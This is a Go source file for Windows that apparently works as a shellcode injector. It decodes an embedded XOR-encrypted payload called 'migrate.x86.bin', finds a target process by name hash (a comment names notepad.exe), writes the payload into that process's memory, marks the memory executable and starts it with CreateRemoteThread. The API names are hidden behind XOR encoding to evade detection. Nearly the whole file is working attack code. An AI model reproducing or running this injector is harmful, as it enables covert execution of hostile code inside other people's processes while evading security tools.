package main

import (
	_ "embed"
	"math"
	"strings"

	"golang.org/x/sys/windows"
)

func IsBitSet(x int, pos int) bool {
	return (x&(1<<pos) != 0)
}

func UtilsXor(data *[]byte, data_len uint64, key *[]byte, key_len uint64) {
	var i uint64 = 0
	var j uint64 = 0

	for ; i < data_len; i++ {
		if j == key_len {
			j = 0
		}

		var bInput byte = 0
		var bitXOR byte = 0

		for b := 0; b < 8; b++ {
			isDataBitSet := IsBitSet(int((*data)[i]), b)
			isKeyBitSet := IsBitSet(int((*key)[j]), b)

			xorBit := (isDataBitSet != isKeyBitSet)

			if xorBit {
				bitXOR = 1
			} else {
				bitXOR = 0
			}

			bInput |= bitXOR << b
		}

		(*data)[i] = bInput

		j++
	}
}

func UtilsStrHash(inputString string) (hash uint64) {

	inputStringLen := uint64(len(inputString))
	var i uint64

	for i < inputStringLen {
		currentFold := uint64(inputString[i])
		currentFold <<= 8

		if i+1 < inputStringLen {
			currentFold |= uint64(inputString[i+1])
			currentFold <<= 8
		}

		if i+2 < inputStringLen {
			currentFold |= uint64(inputString[i+2])
			currentFold <<= 8
		}

		if i+3 < inputStringLen {
			currentFold |= uint64(inputString[i+3])
		}

		hash += currentFold

		i += 4
	}

	return
}

func FindTargetProcessIDByName(targetName string) uint32 {
	var retVal uint32 = math.MaxUint32

	snapshotHandle, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)

	if err != nil {
		panic(err)
	}

	processEntry32 := windows.ProcessEntry32{}
	processEntry32.Size = 568

	err = windows.Process32First(snapshotHandle, &processEntry32)

	if err != nil {
		panic(err)
	}

	err = windows.Process32Next(snapshotHandle, &processEntry32)

	for err == nil {
		AreStringsEqual := strings.Compare(targetName, windows.UTF16ToString(processEntry32.ExeFile[:]))

		if AreStringsEqual == 0 {
			return processEntry32.ProcessID
		}

		err = windows.Process32Next(snapshotHandle, &processEntry32)
	}

	windows.CloseHandle(snapshotHandle)

	return retVal
}

func FindTargetProcessIDByHash(targetNameHash uint64) uint32 {
	var retVal uint32 = math.MaxUint32

	snapshotHandle, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)

	if err != nil {
		panic(err)
	}

	processEntry32 := windows.ProcessEntry32{}
	processEntry32.Size = 568

	err = windows.Process32First(snapshotHandle, &processEntry32)

	if err != nil {
		panic(err)
	}

	err = windows.Process32Next(snapshotHandle, &processEntry32)

	for err == nil {
		hash := UtilsStrHash(windows.UTF16ToString(processEntry32.ExeFile[:]))

		if hash == targetNameHash {
			return processEntry32.ProcessID
		}

		err = windows.Process32Next(snapshotHandle, &processEntry32)
	}

	windows.CloseHandle(snapshotHandle)

	return retVal
}

//go:embed migrate.x86.bin.xor
var Payload []byte

func main() {
	xorKey := []byte{'0', '0', '0', '0', '0'}
	UtilsXor(&Payload, uint64(len(Payload)), &xorKey, uint64(len(xorKey)))

	// targetName := []byte{0x5e, 0x5f, 0x44, 0x55, 0x40, 0x51, 0x54, 0x1e, 0x55, 0x48, 0x55} // notepad.exe XORed
	// UtilsXor(&targetName, uint64(len(targetName)), &xorKey, uint64(len(xorKey)))

	var targetPID uint32 = math.MaxUint32

	targetNameHash := uint64(0x144493d93)

	for targetPID == math.MaxUint32 {
		targetPID = FindTargetProcessIDByHash(targetNameHash)

		if targetPID != math.MaxUint32 {
			break
		}

		windows.SleepEx(5000, false)
	}

	targetProcessHandle, err := windows.OpenProcess(((0x000F0000) | (0x00100000) | 0xFFFF), false, uint32(targetPID))

	if err != nil {
		panic(err)
	}

	kernel32Str := []byte{0x5b, 0x55, 0x42, 0x5e, 0x55, 0x5c, 0x3, 0x2, 0x1e, 0x54, 0x5c, 0x5c}
	UtilsXor(&kernel32Str, uint64(len(kernel32Str)), &xorKey, uint64(len(xorKey)))

	kernel32 := windows.NewLazyDLL(string(kernel32Str))

	virtualAllocExStr := []byte{0x66, 0x59, 0x42, 0x44, 0x45, 0x51, 0x5c, 0x71, 0x5c, 0x5c, 0x5f, 0x53, 0x75, 0x48}
	UtilsXor(&virtualAllocExStr, uint64(len(virtualAllocExStr)), &xorKey, uint64(len(xorKey)))

	virtualAllocEx := kernel32.NewProc(string(virtualAllocExStr))

	payloadMem, _, _ := virtualAllocEx.Call(uintptr(targetProcessHandle), 0, uintptr(len(Payload)), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)

	if payloadMem == 0 {
		return
	}

	var bytesWritten uintptr = 0

	err = windows.WriteProcessMemory(targetProcessHandle, payloadMem, &Payload[0], uintptr(len(Payload)), &bytesWritten)
	if err != nil {
		panic(err)
	}

	var oldProtect uint32 = 0
	err = windows.VirtualProtectEx(targetProcessHandle, payloadMem, uintptr(len(Payload)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		panic(err)
	}

	createRemoteThreadStr := []byte{0x73, 0x42, 0x55, 0x51, 0x44, 0x55, 0x62, 0x55, 0x5d, 0x5f, 0x44, 0x55, 0x64, 0x58, 0x42, 0x55, 0x51, 0x54}
	UtilsXor(&createRemoteThreadStr, uint64(len(createRemoteThreadStr)), &xorKey, uint64(len(xorKey)))

	createRemoteThread := kernel32.NewProc(string(createRemoteThreadStr))
	threadHandle, _, _ := createRemoteThread.Call(uintptr(targetProcessHandle), 0, 0, payloadMem, 0, 0, 0)

	if threadHandle != 0 {
		windows.WaitForSingleObject(windows.Handle(threadHandle), windows.INFINITE)
		windows.CloseHandle(windows.Handle(threadHandle))
	}

	windows.CloseHandle(targetProcessHandle)
}
